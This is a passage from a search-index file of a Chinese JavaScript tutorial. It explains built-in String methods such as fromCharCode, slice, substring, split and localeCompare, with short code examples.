\u3002\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u6216\u591a\u4e2a\u6570\u503c\uff0c\u4ee3\u8868 Unicode \u7801\u70b9\uff0c\u8fd4\u56de\u503c\u662f\u8fd9\u4e9b\u7801\u70b9\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\u3002 1 2 3 4 String . fromCharCode () // \"\" String . fromCharCode ( 97 ) // \"a\" String . fromCharCode ( 104 , 101 , 108 , 108 , 111 ) // \"hello\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c String.fromCharCode \u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u7a7a\uff0c\u5c31\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\uff1b\u5426\u5219\uff0c\u8fd4\u56de\u53c2\u6570\u5bf9\u5e94\u7684 Unicode \u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4e0d\u652f\u6301 Unicode \u7801\u70b9\u5927\u4e8e 0xFFFF \u7684\u5b57\u7b26\uff0c\u5373\u4f20\u5165\u7684\u53c2\u6570\u4e0d\u80fd\u5927\u4e8e 0xFFFF \uff08\u5373\u5341\u8fdb\u5236\u7684 65535\uff09\u3002 1 2 3 4 String . fromCharCode ( 0x20BB7 ) // \"\u0bb7\" String . fromCharCode ( 0x20BB7 ) === String . fromCharCode ( 0x0BB7 ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c String.fromCharCode \u53c2\u6570 0x20BB7 \u5927\u4e8e 0xFFFF \uff0c\u5bfc\u81f4\u8fd4\u56de\u7ed3\u679c\u51fa\u9519\u3002 0x20BB7 \u5bf9\u5e94\u7684\u5b57\u7b26\u662f\u6c49\u5b57 \ud842\udfb7 \uff0c\u4f46\u662f\u8fd4\u56de\u7ed3\u679c\u5374\u662f\u53e6\u4e00\u4e2a\u5b57\u7b26\uff08\u7801\u70b9 0x0BB7 \uff09\u3002\u8fd9\u662f\u56e0\u4e3a String.fromCharCode \u53d1\u73b0\u53c2\u6570\u503c\u5927\u4e8e 0xFFFF \uff0c\u5c31\u4f1a\u5ffd\u7565\u591a\u51fa\u7684\u4f4d\uff08\u5373\u5ffd\u7565 0x20BB7 \u91cc\u9762\u7684 2 \uff09\u3002 \u8fd9\u79cd\u73b0\u8c61\u7684\u6839\u672c\u539f\u56e0\u5728\u4e8e\uff0c\u7801\u70b9\u5927\u4e8e 0xFFFF \u7684\u5b57\u7b26\u5360\u7528\u56db\u4e2a\u5b57\u8282\uff0c\u800c JavaScript \u9ed8\u8ba4\u652f\u6301\u4e24\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5fc5\u987b\u628a 0x20BB7 \u62c6\u6210\u4e24\u4e2a\u5b57\u7b26\u8868\u793a\u3002 1 2 String . fromCharCode ( 0xD842 , 0xDFB7 ) // \"\ud842\udfb7\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 0x20BB7 \u62c6\u6210\u4e24\u4e2a\u5b57\u7b26 0xD842 \u548c 0xDFB7 \uff08\u5373\u4e24\u4e2a\u4e24\u5b57\u8282\u5b57\u7b26\uff0c\u5408\u6210\u4e00\u4e2a\u56db\u5b57\u8282\u5b57\u7b26\uff09\uff0c\u5c31\u80fd\u5f97\u5230\u6b63\u786e\u7684\u7ed3\u679c\u3002\u7801\u70b9\u5927\u4e8e 0xFFFF \u7684\u5b57\u7b26\u7684\u56db\u5b57\u8282\u8868\u793a\u6cd5\uff0c\u7531 UTF-16 \u7f16\u7801\u65b9\u6cd5\u51b3\u5b9a\u3002","title":"String.fromCharCode()"},{"location":"stdlib/string/#_3","text":"","title":"\u5b9e\u4f8b\u5c5e\u6027"},{"location":"stdlib/string/#stringprototypelength","text":"\u5b57\u7b26\u4e32\u5b9e\u4f8b\u7684 length \u5c5e\u6027\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002 1 'abc' . length // 3","title":"String.prototype.length"},{"location":"stdlib/string/#_4","text":"","title":"\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"stdlib/string/#stringprototypecharat","text":"charAt \u65b9\u6cd5\u8fd4\u56de\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u53c2\u6570\u662f\u4ece 0 \u5f00\u59cb\u7f16\u53f7\u7684\u4f4d\u7f6e\u3002 1 2 3 4 var s = new String ( 'abc' ); s . charAt ( 1 ) // \"b\" s . charAt ( s . length - 1 ) // \"c\" \u8fd9\u4e2a\u65b9\u6cd5\u5b8c\u5168\u53ef\u4ee5\u7528\u6570\u7ec4\u4e0b\u6807\u66ff\u4ee3\u3002 1 2 'abc' . charAt ( 1 ) // \"b\" 'abc' [ 1 ] // \"b\" \u5982\u679c\u53c2\u6570\u4e3a\u8d1f\u6570\uff0c\u6216\u5927\u4e8e\u7b49\u4e8e\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c charAt \u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 'abc' . charAt ( - 1 ) // \"\" 'abc' . charAt ( 3 ) // \"\"","title":"String.prototype.charAt()"},{"location":"stdlib/string/#stringprototypecharcodeat","text":"charCodeAt() \u65b9\u6cd5\u8fd4\u56de\u5b57\u7b26\u4e32\u6307\u5b9a\u4f4d\u7f6e\u7684 Unicode \u7801\u70b9\uff08\u5341\u8fdb\u5236\u8868\u793a\uff09\uff0c\u76f8\u5f53\u4e8e String.fromCharCode() \u7684\u9006\u64cd\u4f5c\u3002 1 'abc' . charCodeAt ( 1 ) // 98 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c abc \u7684 1 \u53f7\u4f4d\u7f6e\u7684\u5b57\u7b26\u662f b \uff0c\u5b83\u7684 Unicode \u7801\u70b9\u662f 98 \u3002 \u5982\u679c\u6ca1\u6709\u4efb\u4f55\u53c2\u6570\uff0c charCodeAt \u8fd4\u56de\u9996\u5b57\u7b26\u7684 Unicode \u7801\u70b9\u3002 1 'abc' . charCodeAt () // 97 \u5982\u679c\u53c2\u6570\u4e3a\u8d1f\u6570\uff0c\u6216\u5927\u4e8e\u7b49\u4e8e\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c charCodeAt \u8fd4\u56de NaN \u3002 1 2 'abc' . charCodeAt ( - 1 ) // NaN 'abc' . charCodeAt ( 4 ) // NaN \u6ce8\u610f\uff0c charCodeAt \u65b9\u6cd5\u8fd4\u56de\u7684 Unicode \u7801\u70b9\u4e0d\u4f1a\u5927\u4e8e65536\uff080xFFFF\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u8fd4\u56de\u4e24\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u7684\u7801\u70b9\u3002\u5982\u679c\u9047\u5230\u7801\u70b9\u5927\u4e8e 65536 \u7684\u5b57\u7b26\uff08\u56db\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\uff09\uff0c\u5fc5\u987b\u8fde\u7eed\u4f7f\u7528\u4e24\u6b21 charCodeAt \uff0c\u4e0d\u4ec5\u8bfb\u5165 charCodeAt(i) \uff0c\u8fd8\u8981\u8bfb\u5165 charCodeAt(i+1) \uff0c\u5c06\u4e24\u4e2a\u503c\u653e\u5728\u4e00\u8d77\uff0c\u624d\u80fd\u5f97\u5230\u51c6\u786e\u7684\u5b57\u7b26\u3002","title":"String.prototype.charCodeAt()"},{"location":"stdlib/string/#stringprototypeconcat","text":"concat \u65b9\u6cd5\u7528\u4e8e\u8fde\u63a5\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u5b57\u7b26\u4e32\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 var s1 = 'abc' ; var s2 = 'def' ; s1 . concat ( s2 ) // \"abcdef\" s1 // \"abc\" \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a\u53c2\u6570\u3002 1 'a' . concat ( 'b' , 'c' ) // \"abc\" \u5982\u679c\u53c2\u6570\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c concat \u65b9\u6cd5\u4f1a\u5c06\u5176\u5148\u8f6c\u4e3a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u518d\u8fde\u63a5\u3002 1 2 3 4 5 6 var one = 1 ; var two = 2 ; var three = '3' ; '' . concat ( one , two , three ) // \"123\" one + two + three // \"33\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c concat \u65b9\u6cd5\u5c06\u53c2\u6570\u5148\u8f6c\u6210\u5b57\u7b26\u4e32\u518d\u8fde\u63a5\uff0c\u6240\u4ee5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u4e09\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u4e32\u3002\u4f5c\u4e3a\u5bf9\u6bd4\uff0c\u52a0\u53f7\u8fd0\u7b97\u7b26\u5728\u4e24\u4e2a\u8fd0\u7b97\u6570\u90fd\u662f\u6570\u503c\u65f6\uff0c\u4e0d\u4f1a\u8f6c\u6362\u7c7b\u578b\uff0c\u6240\u4ee5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u4e24\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u4e32\u3002","title":"String.prototype.concat()"},{"location":"stdlib/string/#stringprototypeslice","text":"slice() \u65b9\u6cd5\u7528\u4e8e\u4ece\u539f\u5b57\u7b26\u4e32\u53d6\u51fa\u5b50\u5b57\u7b26\u4e32\u5e76\u8fd4\u56de\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\u3002\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b50\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b50\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u4f4d\u7f6e\uff08\u4e0d\u542b\u8be5\u4f4d\u7f6e\uff09\u3002 1 'JavaScript' . slice ( 0 , 4 ) // \"Java\" \u5982\u679c\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5219\u8868\u793a\u5b50\u5b57\u7b26\u4e32\u4e00\u76f4\u5230\u539f\u5b57\u7b26\u4e32\u7ed3\u675f\u3002 1 'JavaScript' . slice ( 4 ) // \"Script\" \u5982\u679c\u53c2\u6570\u662f\u8d1f\u503c\uff0c\u8868\u793a\u4ece\u7ed3\u5c3e\u5f00\u59cb\u5012\u6570\u8ba1\u7b97\u7684\u4f4d\u7f6e\uff0c\u5373\u8be5\u8d1f\u503c\u52a0\u4e0a\u5b57\u7b26\u4e32\u957f\u5ea6\u3002 1 2 3 'JavaScript' . slice ( - 6 ) // \"Script\" 'JavaScript' . slice ( 0 , - 6 ) // \"Java\" 'JavaScript' . slice ( - 2 , - 1 ) // \"p\" \u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5927\u4e8e\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u6b63\u6570\u60c5\u51b5\u4e0b\uff09\uff0c slice() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002 1 'JavaScript' . slice ( 2 , 1 ) // \"\"","title":"String.prototype.slice()"},{"location":"stdlib/string/#stringprototypesubstring","text":"substring \u65b9\u6cd5\u7528\u4e8e\u4ece\u539f\u5b57\u7b26\u4e32\u53d6\u51fa\u5b50\u5b57\u7b26\u4e32\u5e76\u8fd4\u56de\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\uff0c\u8ddf slice \u65b9\u6cd5\u5f88\u76f8\u50cf\u3002\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u5b50\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u8868\u793a\u7ed3\u675f\u4f4d\u7f6e\uff08\u8fd4\u56de\u7ed3\u679c\u4e0d\u542b\u8be5\u4f4d\u7f6e\uff09\u3002 1 'JavaScript' . substring ( 0 , 4 ) // \"Java\" \u5982\u679c\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5219\u8868\u793a\u5b50\u5b57\u7b26\u4e32\u4e00\u76f4\u5230\u539f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u3002 1 'JavaScript' . substring ( 4 ) // \"Script\" \u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5927\u4e8e\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c substring \u65b9\u6cd5\u4f1a\u81ea\u52a8\u66f4\u6362\u4e24\u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\u3002 1 2 3 'JavaScript' . substring ( 10 , 4 ) // \"Script\" // \u7b49\u540c\u4e8e 'JavaScript' . substring ( 4 , 10 ) // \"Script\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8c03\u6362 substring \u65b9\u6cd5\u7684\u4e24\u4e2a\u53c2\u6570\uff0c\u90fd\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002 \u5982\u679c\u53c2\u6570\u662f\u8d1f\u6570\uff0c substring \u65b9\u6cd5\u4f1a\u81ea\u52a8\u5c06\u8d1f\u6570\u8f6c\u4e3a0\u3002 1 2 'JavaScript' . substring ( - 3 ) // \"JavaScript\" 'JavaScript' . substring ( 4 , - 3 ) // \"Java\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u7684\u53c2\u6570 -3 \u4f1a\u81ea\u52a8\u53d8\u6210 0 \uff0c\u7b49\u540c\u4e8e 'JavaScript'.substring(4, 0) \u3002\u7531\u4e8e\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5c0f\u4e8e\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4f1a\u81ea\u52a8\u4e92\u6362\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8fd4\u56de Java \u3002 \u7531\u4e8e\u8fd9\u4e9b\u89c4\u5219\u8fdd\u53cd\u76f4\u89c9\uff0c\u56e0\u6b64\u4e0d\u5efa\u8bae\u4f7f\u7528 substring \u65b9\u6cd5\uff0c\u5e94\u8be5\u4f18\u5148\u4f7f\u7528 slice \u3002","title":"String.prototype.substring()"},{"location":"stdlib/string/#stringprototypesubstr","text":"substr \u65b9\u6cd5\u7528\u4e8e\u4ece\u539f\u5b57\u7b26\u4e32\u53d6\u51fa\u5b50\u5b57\u7b26\u4e32\u5e76\u8fd4\u56de\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\uff0c\u8ddf slice \u548c substring \u65b9\u6cd5\u7684\u4f5c\u7528\u76f8\u540c\u3002 substr \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b50\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\u8ba1\u7b97\uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b50\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002 1 'JavaScript' . substr ( 4 , 6 ) // \"Script\" \u5982\u679c\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5219\u8868\u793a\u5b50\u5b57\u7b26\u4e32\u4e00\u76f4\u5230\u539f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u3002 1 'JavaScript' . substr ( 4 ) // \"Script\" \u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8d1f\u6570\uff0c\u8868\u793a\u5012\u6570\u8ba1\u7b97\u7684\u5b57\u7b26\u4f4d\u7f6e\u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8d1f\u6570\uff0c\u5c06\u88ab\u81ea\u52a8\u8f6c\u4e3a0\uff0c\u56e0\u6b64\u4f1a\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 'JavaScript' . substr ( - 6 ) // \"Script\" 'JavaScript' . substr ( 4 , - 1 ) // \"\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u7684\u53c2\u6570 -1 \u81ea\u52a8\u8f6c\u4e3a 0 \uff0c\u8868\u793a\u5b50\u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a 0 \uff0c\u6240\u4ee5\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002","title":"String.prototype.substr()"},{"location":"stdlib/string/#stringprototypeindexofstringprototypelastindexof","text":"indexOf \u65b9\u6cd5\u7528\u4e8e\u786e\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32\u5728\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u8fd4\u56de\u7ed3\u679c\u662f\u5339\u914d\u5f00\u59cb\u7684\u4f4d\u7f6e\u3002\u5982\u679c\u8fd4\u56de -1 \uff0c\u5c31\u8868\u793a\u4e0d\u5339\u914d\u3002 1 2 'hello world' . indexOf ( 'o' ) // 4 'JavaScript' . indexOf ( 'script' ) // -1 indexOf \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u4ece\u8be5\u4f4d\u7f6e\u5f00\u59cb\u5411\u540e\u5339\u914d\u3002 1 'hello world' . indexOf ( 'o' , 6 ) // 7 lastIndexOf \u65b9\u6cd5\u7684\u7528\u6cd5\u8ddf indexOf \u65b9\u6cd5\u4e00\u81f4\uff0c\u4e3b\u8981\u7684\u533a\u522b\u662f lastIndexOf \u4ece\u5c3e\u90e8\u5f00\u59cb\u5339\u914d\uff0c indexOf \u5219\u662f\u4ece\u5934\u90e8\u5f00\u59cb\u5339\u914d\u3002 1 'hello world' . lastIndexOf ( 'o' ) // 7 \u53e6\u5916\uff0c lastIndexOf \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8868\u793a\u4ece\u8be5\u4f4d\u7f6e\u8d77\u5411\u524d\u5339\u914d\u3002 1 'hello world' . lastIndexOf ( 'o' , 6 ) // 4","title":"String.prototype.indexOf()\uff0cString.prototype.lastIndexOf()"},{"location":"stdlib/string/#stringprototypetrim","text":"trim \u65b9\u6cd5\u7528\u4e8e\u53bb\u9664\u5b57\u7b26\u4e32\u4e24\u7aef\u7684\u7a7a\u683c\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u5b57\u7b26\u4e32\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\u3002 1 2 ' hello world ' . trim () // \"hello world\" \u8be5\u65b9\u6cd5\u53bb\u9664\u7684\u4e0d\u4ec5\u662f\u7a7a\u683c\uff0c\u8fd8\u5305\u62ec\u5236\u8868\u7b26\uff08 \\t \u3001 \\v \uff09\u3001\u6362\u884c\u7b26\uff08 \\n \uff09\u548c\u56de\u8f66\u7b26\uff08 \\r \uff09\u3002 1 '\\r\\nabc \\t' . trim () // 'abc'","title":"String.prototype.trim()"},{"location":"stdlib/string/#stringprototypetolowercasestringprototypetouppercase","text":"toLowerCase \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u5168\u90e8\u8f6c\u4e3a\u5c0f\u5199\uff0c toUpperCase \u5219\u662f\u5168\u90e8\u8f6c\u4e3a\u5927\u5199\u3002\u5b83\u4eec\u90fd\u8fd4\u56de\u4e00\u4e2a\u65b0\u5b57\u7b26\u4e32\uff0c\u4e0d\u6539\u53d8\u539f\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 'Hello World' . toLowerCase () // \"hello world\" 'Hello World' . toUpperCase () // \"HELLO WORLD\"","title":"String.prototype.toLowerCase()\uff0cString.prototype.toUpperCase()"},{"location":"stdlib/string/#stringprototypematch","text":"match \u65b9\u6cd5\u7528\u4e8e\u786e\u5b9a\u539f\u5b57\u7b26\u4e32\u662f\u5426\u5339\u914d\u67d0\u4e2a\u5b50\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u4e3a\u5339\u914d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u5982\u679c\u6ca1\u6709\u627e\u5230\u5339\u914d\uff0c\u5219\u8fd4\u56de null \u3002 1 2 'cat, bat, sat, fat' . match ( 'at' ) // [\"at\"] 'cat, bat, sat, fat' . match ( 'xt' ) // null \u8fd4\u56de\u7684\u6570\u7ec4\u8fd8\u6709 index \u5c5e\u6027\u548c input \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u5339\u914d\u5b57\u7b26\u4e32\u5f00\u59cb\u7684\u4f4d\u7f6e\u548c\u539f\u59cb\u5b57\u7b26\u4e32\u3002 1 2 3 var matches = 'cat, bat, sat, fat' . match ( 'at' ); matches . index // 1 matches . input // \"cat, bat, sat, fat\" match \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be6\u89c1\u300a\u6b63\u5219\u8868\u8fbe\u5f0f\u300b\u4e00\u7ae0\u3002","title":"String.prototype.match()"},{"location":"stdlib/string/#stringprototypesearchstringprototypereplace","text":"search \u65b9\u6cd5\u7684\u7528\u6cd5\u57fa\u672c\u7b49\u540c\u4e8e match \uff0c\u4f46\u662f\u8fd4\u56de\u503c\u4e3a\u5339\u914d\u7684\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\u3002\u5982\u679c\u6ca1\u6709\u627e\u5230\u5339\u914d\uff0c\u5219\u8fd4\u56de -1 \u3002 1 'cat, bat, sat, fat' . search ( 'at' ) // 1 search \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be6\u89c1\u300a\u6b63\u5219\u8868\u8fbe\u5f0f\u300b\u4e00\u8282\u3002 replace \u65b9\u6cd5\u7528\u4e8e\u66ff\u6362\u5339\u914d\u7684\u5b50\u5b57\u7b26\u4e32\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u53ea\u66ff\u6362\u7b2c\u4e00\u4e2a\u5339\u914d\uff08\u9664\u975e\u4f7f\u7528\u5e26\u6709 g \u4fee\u9970\u7b26\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff09\u3002 1 'aaa' . replace ( 'a' , 'b' ) // \"baa\" replace \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be6\u89c1\u300a\u6b63\u5219\u8868\u8fbe\u5f0f\u300b\u4e00\u8282\u3002","title":"String.prototype.search()\uff0cString.prototype.replace()"},{"location":"stdlib/string/#stringprototypesplit","text":"split \u65b9\u6cd5\u6309\u7167\u7ed9\u5b9a\u89c4\u5219\u5206\u5272\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2a\u7531\u5206\u5272\u51fa\u6765\u7684\u5b50\u5b57\u7b26\u4e32\u7ec4\u6210\u7684\u6570\u7ec4\u3002 1 'a|b|c' . split ( '|' ) // [\"a\", \"b\", \"c\"] \u5982\u679c\u5206\u5272\u89c4\u5219\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u8fd4\u56de\u6570\u7ec4\u7684\u6210\u5458\u662f\u539f\u5b57\u7b26\u4e32\u7684\u6bcf\u4e00\u4e2a\u5b57\u7b26\u3002 1 'a|b|c' . split ( '' ) // [\"a\", \"|\", \"b\", \"|\", \"c\"] \u5982\u679c\u7701\u7565\u53c2\u6570\uff0c\u5219\u8fd4\u56de\u6570\u7ec4\u7684\u552f\u4e00\u6210\u5458\u5c31\u662f\u539f\u5b57\u7b26\u4e32\u3002 1 'a|b|c' . split () // [\"a|b|c\"] \u5982\u679c\u6ee1\u8db3\u5206\u5272\u89c4\u5219\u7684\u4e24\u4e2a\u90e8\u5206\u7d27\u90bb\u7740\uff08\u5373\u4e24\u4e2a\u5206\u5272\u7b26\u4e2d\u95f4\u6ca1\u6709\u5176\u4ed6\u5b57\u7b26\uff09\uff0c\u5219\u8fd4\u56de\u6570\u7ec4\u4e4b\u4e2d\u4f1a\u6709\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002 1 'a||c' . split ( '|' ) // ['a', '', 'c'] \u5982\u679c\u6ee1\u8db3\u5206\u5272\u89c4\u5219\u7684\u90e8\u5206\u5904\u4e8e\u5b57\u7b26\u4e32\u7684\u5f00\u5934\u6216\u7ed3\u5c3e\uff08\u5373\u5b83\u7684\u524d\u9762\u6216\u540e\u9762\u6ca1\u6709\u5176\u4ed6\u5b57\u7b26\uff09\uff0c\u5219\u8fd4\u56de\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6216\u6700\u540e\u4e00\u4e2a\u6210\u5458\u662f\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 '|b|c' . split ( '|' ) // [\"\", \"b\", \"c\"] 'a|b|' . split ( '|' ) // [\"a\", \"b\", \"\"] split \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u9650\u5b9a\u8fd4\u56de\u6570\u7ec4\u7684\u6700\u5927\u6210\u5458\u6570\u3002 1 2 3 4 5 'a|b|c' . split ( '|' , 0 ) // [] 'a|b|c' . split ( '|' , 1 ) // [\"a\"] 'a|b|c' . split ( '|' , 2 ) // [\"a\", \"b\"] 'a|b|c' . split ( '|' , 3 ) // [\"a\", \"b\", \"c\"] 'a|b|c' . split ( '|' , 4 ) // [\"a\", \"b\", \"c\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c split \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u51b3\u5b9a\u4e86\u8fd4\u56de\u6570\u7ec4\u7684\u6210\u5458\u6570\u3002 split \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be6\u89c1\u300a\u6b63\u5219\u8868\u8fbe\u5f0f\u300b\u4e00\u8282\u3002","title":"String.prototype.split()"},{"location":"stdlib/string/#stringprototypelocalecompare","text":"localeCompare \u65b9\u6cd5\u7528\u4e8e\u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\u3002\u5b83\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u5982\u679c\u5c0f\u4e8e0\uff0c\u8868\u793a\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u5c0f\u4e8e\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u4e32\uff1b\u5982\u679c\u7b49\u4e8e0\uff0c\u8868\u793a\u4e24\u8005\u76f8\u7b49\uff1b\u5982\u679c\u5927\u4e8e0\uff0c\u8868\u793a\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u5927\u4e8e\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u4e32\u3002 1 2 'apple' . localeCompare ( 'banana' ) // -1 'apple' . localeCompare ( 'apple' ) // 0 \u8be5\u65b9\u6cd5\u7684\u6700\u5927\u7279\u70b9\uff0c\u5c31\u662f\u4f1a\u8003\u8651\u81ea\u7136\u8bed\u8a00\u7684\u987a\u5e8f\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5927\u5199\u7684\u82f1\u6587\u5b57\u6bcd\u5c0f\u4e8e\u5c0f\u5199\u5b57\u6bcd\u3002 1 'B' > 'a' // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u6bcd B \u5c0f\u4e8e\u5b57\u6bcd a \u3002\u56e0\u4e3a JavaScript \u91c7\u7528\u7684\u662f Unicode \u7801\u70b9\u6bd4\u8f83\uff0c B \u7684\u7801\u70b9\u662f66\uff0c\u800c a \u7684\u7801\u70b9\u662f97\u3002 \u4f46\u662f\uff0c localeCompare \u65b9\u6cd5\u4f1a\u8003\u8651\u81ea\u7136\u8bed\u8a00\u7684\u6392\u5e8f\u60c5\u51b5\uff0c\u5c06 B \u6392\u5728 a \u7684\u524d\u9762\u3002 1 'B' . localeCompare ( 'a' ) // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c localeCompare \u65b9\u6cd5\u8fd4\u56de\u6574\u65701\uff0c\u8868\u793a B \u8f83\u5927\u3002 localeCompare \u8fd8\u53ef\u4ee5\u6709\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u6307\u5b9a\u6240\u4f7f\u7528\u7684\u8bed\u8a00\uff08\u9ed8\u8ba4\u662f\u82f1\u8bed\uff09\uff0c\u7136\u540e\u6839\u636e\u8be5\u8bed\u8a00\u7684\u89c4\u5219\u8fdb\u884c\u6bd4\u8f83\u3002 1 2 '\u00e4' . localeCompare ( 'z' , 'de' ) // -1 '\u00e4' . localeCompare ( 'z' , 'sv' ) // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c de 